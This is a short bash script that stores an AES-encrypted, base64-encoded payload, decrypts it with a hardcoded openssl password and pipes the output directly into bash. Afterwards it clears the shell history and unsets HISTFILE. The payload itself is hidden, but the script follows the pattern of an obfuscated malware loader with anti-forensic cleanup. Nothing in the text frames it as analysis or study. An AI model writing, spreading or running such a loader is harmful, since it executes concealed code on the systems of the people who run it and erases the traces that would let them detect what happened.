#!/bin/bash
ENC_DATA="U2FsdGVkX18HcoG56/hFK6INdIUwNnnzy0TrdNPCKpqqlBgG4VYXKEJD2US1dc8RxKB+m0J44vu9LFmol6qiQncU0IYt8+726nMFO6D6JF3y2Li68viLx/XXqNEh+pGs7+aYqKc7Kle+Rgk4Yr+czPwYX2ZzjEXok629hp+dplba4KsLOlXRPtB/FhKkqYsi+zQ+ywb/ocrfuiWk/1s9Q2Yvj0aCmt5HtI/OpeFnKAAar5vJkZfof2xK06zwtghegietukj4KHV89JI8eH6J0mbIOwdFQXyhfhPmmfTcCQm8LVYkCcpPtLl8V71p0ZCstb3S3ocbo6X3lUiP8R0UNVkKKBacCEGssgLnNd9u1xU63vDFCeZH6yQLYvY/R6Y1Vb9rG9ChHr39tZ5rlHM8cfxMXyuJpjPAkjFg7NmgCMVJV2EYWbp0WANdJloQF6nJh+h5LIbJ98s/gMqVx567NnwqQijuK8XMriavhRQITwce8lxUHeh49/vnDKcREBnwEM8vbn/lXgTcE2rEfyu+KpHsTe0JpwQ/HjhIHk6+gRd4Ov9PdQBCVVAizhSLbRr44JFslTyNH/PAShYX/OzZeg=="

echo "$ENC_DATA" | openssl enc -aes-256-cbc -pbkdf2 -iter 100000 -a -d -salt -pass pass:bismillah 2>/dev/null | bash

unset ENC_DATA
history -c && unset HISTFILE
